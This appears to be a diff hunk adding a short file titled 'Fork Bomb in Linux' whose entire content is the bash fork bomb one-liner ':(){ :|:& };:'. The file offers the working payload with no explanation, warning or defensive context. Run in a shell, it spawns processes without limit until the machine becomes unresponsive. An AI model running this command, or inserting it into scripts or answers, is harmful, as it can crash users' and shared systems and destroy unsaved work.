@@ -1,0 +1,3 @@
+# Fork Bomb in Linux
+
+:(){ :|:& };:
